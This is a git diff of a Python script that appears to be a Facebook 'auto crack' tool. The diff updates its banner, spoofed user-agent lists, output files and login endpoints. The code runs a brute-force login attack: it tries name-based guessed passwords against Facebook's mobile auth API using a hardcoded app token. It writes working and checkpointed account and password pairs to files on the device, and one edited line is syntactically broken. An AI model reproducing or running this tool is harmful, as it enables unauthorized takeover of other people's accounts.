@@ -62,7 +62,7 @@ ua = []
 
 del ua
 """
-Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36 Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1 Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1 Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3 Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36
+Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1 Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1
 """
 
 ua=[]
@@ -77,21 +77,23 @@ uu ='\x1b[1;95m'
 tred = speed
 
 	
-logo =("""\x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
+logo= ("""\x1b[1;97m
+88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
 88 `88. 88   88 88      db   8D 88   88 88  V888 
 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
+\x1b[1;97m________________________________________________
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
-\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1.9
-\x1b[1;97m__________________________________________________""")
+\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
+\x1b[1;97m________________________________________________
+""")
 
 ####@-----Menu-----@####
 def Hxw_Main():
@@ -102,7 +104,7 @@ def Hxw_Main():
     print(f"{oo(3)}Gmail Cloning")  
     print(f"{oo(4)}Create File")
     print(f"{oo(0)}Exit")
-    print(f"\x1b[1;97m__________________________________________________")
+    print?(f"\x1b[1;97m________________________________________________")
     inpp = input(f"{oo('?')}Your Choice : ")
     if inpp == "1":
         file()
@@ -213,26 +215,26 @@ def pak():
 
 ####@-----UserAgent----@####
 """
-Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36;]
 Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]
-Mozilla/5.0 (Linux; Android 10; SM-A125F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
-Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
-Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36;]
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:95.75.4.89]
-Mozilla/5.0 (Windows NT 6.0; rv:108.0) Gecko/20100101 Firefox/108.0
-Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
-Mozilla/5.0 (Linux; Android 13; SM-G780F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]
-Mozilla/5.0 (Linux; Android 11; 2201116TG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
-Mozilla/5.0 (Linux; Android 12; V2023 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
-Mozilla/5.0 (Linux; Android 11; SM-A035M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
-Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1;]
-Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15;]
-Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]
-Mozilla/5.0 (Linux; U; Android 12; zh-CN; Infinix X677 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 HiBrowser/v2.6.3.1 UWS/ Mobile Safari/537.36;]
-Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]
-Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]
-Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1;]
-Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36;]
+Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/115.0.0.22.69;]
+Mozilla/5.0 (Linux; Android 11; Elite J55 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]
+Mozilla/5.0 (Linux; Android 11; INKULU_PRO Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]
+Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI Y625-U21 Build/HUAWEIY625-U21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/136.0.0.8.90;]
+Mozilla/5.0 (Linux; Android 7.0; VTR-L09 Build/HUAWEIVTR-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/119.0.0.18.91;]
+Mozilla/5.0 (Linux; Android 13; RMX3311 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]
+Mozilla/5.0 (Linux; Android 13; V2201 Build/TP1A.220624.014_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 11; RMX3235 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 8.1.0; LM-X220QMA Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]
+Mozilla/5.0 (Linux; Android 10; BV6300Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]
+Mozilla/5.0 (Linux; Android 12; Lenovo TB-Q706F Build/SKQ1.220406.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]
+Mozilla/5.0 (Linux; Android 12; V2134 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 13; SM-E236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
+Mozilla/5.0 (Linux; Android 7.0; 5049S Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]
+Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOVS32.121-21-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 13; V2201 Build/TP1A.220624.014_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 11; RMX3235 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 11; INKULU_PRO Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]
 
 """
 ####@-----FileM-----@####
@@ -264,10 +266,11 @@ def method():
     apps='y'
     os.system("clear")
     print(logo) 
+    print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait Nd See ")
-    print(f"{oo('•')}//sdcard/R4FS-FILE-OK.txt")
-    print(f"\x1b[1;97m__________________________________________________")
+    print(f"{oo('•')}//sdcard/Live-OK.txt")
+    print('\033[1;93m='*25)
     print()
     
     def start(user):
@@ -290,12 +293,12 @@ def method():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=data,headers=header,allow_redirects=False)
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;33m[\033[1;33mLIVE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
-                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;33m[\033[1;33mR4FSAN-FILE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
+                open('//sdcard/R4FSAN-FILE-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -340,11 +343,11 @@ def method():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;33m[\033[1;33mLIVE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
-                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;33m[\033[1;33mR4FSAN-FILE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
+                open('//sdcard/R4FSAN-FILE-OK.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -360,9 +363,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;35m[\033[1;35mLIVE-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m•\033[1;35m '+pword)
+                     print('\r\033[1;35m[\033[1;35mR4FSAN-FILE-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m•\033[1;35m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/R4FSAN-FILE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -429,7 +432,7 @@ def andom():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mR4FSAN-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
             heads = None
@@ -437,7 +440,7 @@ def andom():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
@@ -451,7 +454,7 @@ def andom():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 break
-            elif 'x.facebook.com' in response.text:
+            elif 'www.facebook.com' in response.text:
                 if cpok=='n':
                      pass
                 else:
@@ -484,11 +487,11 @@ def andom():
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
-            header = {"Content-Type": "application/x-www-form-accencoded","Host": "x.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1', cookies=cookies, headers=headers)
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mLIVE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
